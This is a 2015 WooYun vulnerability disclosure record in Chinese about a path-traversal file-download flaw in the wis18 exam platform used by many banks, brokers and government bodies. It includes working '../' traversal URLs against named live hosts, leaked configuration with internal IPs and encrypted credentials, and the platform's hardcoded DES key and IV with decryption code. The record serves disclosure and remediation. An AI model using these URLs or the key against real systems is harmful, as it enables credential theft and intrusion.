{"id": 725, "wybug_id": "wooyun-2015-0116106", "wybug_title": "新风向通用考试平台影响金融/IT/电力通讯/教育/等行业（多家银行、证券企业）", "wybug_corp": "深圳市新风向科技有限公司", "wybug_author": "piaoye", "wybug_date": "2015-05-25 23:04", "wybug_open_date": "2015-08-28 00:52", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "任意文件读取利用", "任意文件读取", "文件操作参数未加过滤", "敏感信息泄露"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-02：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-07-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-28：\t细节向公众公开  简要描述： 客户量巨大 信息量巨大 奇葩漏洞。。 详细说明：  服务厂商为：http://www.newvane.com.cn/ 但按照域名找到北京的http://www.wis18.com/ 两家公司是一个公司吧。客户列表在：http://www.newvane.com.cn/index.php?ac=article&at=read&did=351\n电力及通信行业\t 广东省移动                   \t辽宁省移动 黑龙江电业局 \t浙江金华燃机电厂粤电力东莞电厂 \t浙江省电信苏州电力公司\t上海电信培训中心  广东电力发展股份有限公司\t中国联通总部河南商丘供电局\t浙江联通 中国广东核电集团\t深圳市核电环通有限公司中广核能源有限公司\t中广核工程有限公司海南省移动\t  \t IT及制造行业  \t 中国海尔集团\t深圳市宏电技术股份有限公司华为技术有限公司\t腾讯科技有限公司金蝶国际软件集团有限公司\t兰州瑞圣通信技术有限公司德赛集团有限公司\t济南新丰泽科技开发有限公司洪都航空工业集团有限责任公司\t中国国际海运集装箱集团有限公司蓝微电子有限公司\t  \t 金融行业  \t 中国人民银行总行\t中国平安保险集团中国工商银行总行\t中国人寿保险云南省分公司 招商银行总行\t太平财产保险有限公司中国银行总行\t民安保险有限公司交通银行总行\t生命人寿保险有限公司深圳发展银行总行\t联合证券有限责任公司宁夏银行总行\t广发证券股份有限公司中国民生银行总行\t中投证券有限责任公司上海农商行总行\t光大证券股份有限公司中国人民银行贵阳中心支行\t德邦证券股份有限公司中国人民银行济南中心分行\t国元证券股份有限公司中国工商银行杭州金融学院\t国金证券股份有限公司中国工商银行长春金融学院\t英大证券有限责任公司恒丰银行股份有限公司\t爱建证券有限责任公司招商银行电话银行中心 \t中原证券股份有限公司济源农村商业银行\t西南证券股份有限公司中信银行深圳分行 \t中天证券有限责任公司中信银行成都分行\t招商证券股份有限公司中信银行郑州分行\t世纪证券有限责任公司中信银行东莞分行\t华林证券有限责任公司中信银行青岛分行\t众成证券经纪有限公司深圳邮政储蓄银行\t浙商证券有限责任公司中国建设银行深圳分行\t深圳证券交易所中国农业银行客户服务中心\t博时基金管理有限公司上饶商业银行\t  \t 政府及事业单位  \t 中国南方航空股份有限公司\t成都市成华区国税局中国民航培训中心 \t广州盾建地下工程有限公司四川乐山市地方税务局  \t香港中旅集团有限公司江苏宿迁地方税务局  \t深圳市质量技术监督局江苏宿迁公安局 \t富阳市委组织部西安市地方税务局 \t海南省消防总队中国税务信息网  \t广东省怀集监狱河北邢台国家税务局  \t中国银行业监督管理委员会上海监管局大连市国家税务局  \t中国银行业监督管理委员会新疆监管局中国邮政湖北省公司培训中心\t深圳市特种设备安全检验研究院厦门市地方税务局  \t湖北省邮政培训中心深圳市住房公积金管理中心\t深圳航空股份有限公司\n漏洞为任意文件下载漏洞，可导致各种信息泄露。很多在内网 以民生银行内部员工考试系统为例：http://edu.cmbc.com.cn/wis18/file.showimage.flow?filename=../WEB-INF/web.xmlhttp://edu.cmbc.com.cn/wis18/file.showimage.flow?filename=../WEB-INF/lib/wis18.jar  源码包/system/config/ds.xml 数据配置文件\n<?xml version=\"1.0\" encoding=\"utf-8\"?><datasource>   <db>sqlserver</db>    <ip>192.168.100.70</ip>    <port>1433</port>    <databasename>onlineexam</databasename>    <connection-url>jdbc:sqlserver://192.168.100.2:1433;databasename=onlineexam</connection-url>    <driver-class>com.microsoft.sqlserver.jdbc.SQLServerDriver</driver-class>    <username>exam1</username>    <password>{DES}LoKRQ33l36TT+1HX1XtP4Q==</password>    <idleconnectiontestperiod>60</idleconnectiontestperiod>    <idlemaxage>240</idlemaxage>    <minconnectionsperpartition>60</minconnectionsperpartition>    <maxconnectionsperpartition>100</maxconnectionsperpartition>    <partitioncount>3</partitioncount>    <acquireincrement>10</acquireincrement>    <preparedstatementcachesize>100</preparedstatementcachesize>    <statementscachedperconnection>30</statementscachedperconnection>    <releasehelperthreads>3</releasehelperthreads>    <initsql>select * from s_sysid_tab</initsql> </datasource>\nsystem/config/manauser.xml  管理员账号密码\n<?xml version=\"1.0\" encoding=\"utf-8\"?><system>   <username>admin</username>    <password>{DES}RBCpec7d8g1ViNgpFMM8Tg==</password> </system>\n因为密码都是des加密的 所以编译后找到deskey\npublic static void main(String[] args) {    try {      System.out.println(desDecrypt(\"c3BathaFi8t7Oi0JBiWLHQ==\"));    } catch (Exception ex) {      ex.printStackTrace();    }  }  static  {    try    {      encipher = Cipher.getInstance(\"DES/CBC/PKCS5Padding\");      decipher = Cipher.getInstance(\"DES/CBC/PKCS5Padding\");      String strDesKey = \"Wis@1/-G&od=\";      String strDesIV = \"No1&>A$:Sys=\";      BASE64Decoder b = new BASE64Decoder();      desKeySpec = new DESKeySpec(b.decodeBuffer(strDesKey));      SecretKeyFactory keyFactory = SecretKeyFactory.getInstance(\"DES\");      secretKey = keyFactory.generateSecret(desKeySpec);      iv = new IvParameterSpec(b.decodeBuffer(strDesIV));      encipher.init(1, secretKey, iv);      decipher.init(2, secretKey, iv);    } catch (Exception e) {      e.printStackTrace();    }\n   漏洞证明：  其他客户：上海银行：http://learning.bankofshanghai.com/wis18/file.showimage.flow?filename=../system/config/manauser.xml海尔：http://haierhr.ct-edu.com.cn/wis18/file.showimage.flow?filename=../system/config/manauser.xmlhttp://www.sdchuxin.com/wis18/file.showimage.flow?filename=../system/config/manauser.xml广发证券：http://121.8.153.10/wis18/file.showimage.flow?filename=../system/config/manauser.xml工商银行http://80.34.174.3/wis18/ 貌似不能外网访问。   修复方案：  联系厂商进行紧急升级，对文件下载参数进行验证处理 最好实现虚拟路径直接下载 类似url/1.LOG   版权声明：转载请注明来源 piaoye@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-05-30 00:52 厂商回复： CNVD确认并复现所述情况，已经由CNVD通过网站公开联系方式向软件生产厂商通报，同时涉及的案例已经转由CNCERT向银监会通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}